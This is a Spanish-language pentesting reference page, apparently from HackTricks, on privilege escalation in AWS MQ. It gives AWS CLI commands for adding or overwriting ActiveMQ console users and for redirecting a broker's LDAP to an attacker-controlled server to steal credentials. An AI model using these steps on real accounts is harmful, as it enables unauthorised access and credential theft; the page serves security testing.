# AWS - MQ Privesc

{{#include ../../../banners/hacktricks-training.md}}

## MQ

Para más información sobre MQ consulta:

{{#ref}}
../aws-services/aws-mq-enum.md
{{#endref}}

### `mq:ListBrokers`, `mq:CreateUser`

Con esos permisos puedes **crear un nuevo usuario en un broker de ActimeMQ** (esto no funciona en RabbitMQ):
```bash
aws mq list-brokers
aws mq create-user --broker-id <value> --console-access --password <value> --username <value>
```
**Impacto Potencial:** Acceso a información sensible navegando a través de ActiveMQ

### `mq:ListBrokers`, `mq:ListUsers`, `mq:UpdateUser`

Con esos permisos puedes **crear un nuevo usuario en un broker de ActiveMQ** (esto no funciona en RabbitMQ):
```bash
aws mq list-brokers
aws mq list-users --broker-id <value>
aws mq update-user --broker-id <value> --console-access --password <value> --username <value>
```
**Impacto Potencial:** Acceso a información sensible navegando a través de ActiveMQ

### `mq:ListBrokers`, `mq:UpdateBroker`

Si un broker está utilizando **LDAP** para la autorización con **ActiveMQ**. Es posible **cambiar** la **configuración** del servidor LDAP utilizado a **uno controlado por el atacante**. De esta manera, el atacante podrá **robar todas las credenciales que se envían a través de LDAP**.
```bash
aws mq list-brokers
aws mq update-broker --broker-id <value> --ldap-server-metadata=...
```
Si de alguna manera pudieras encontrar las credenciales originales utilizadas por ActiveMQ, podrías realizar un MitM, robar las credenciales, usarlas en el servidor original y enviar la respuesta (quizás solo reutilizando las credenciales robadas podrías hacer esto).

**Impacto Potencial:** Robar credenciales de ActiveMQ

{{#include ../../../banners/hacktricks-training.md}}
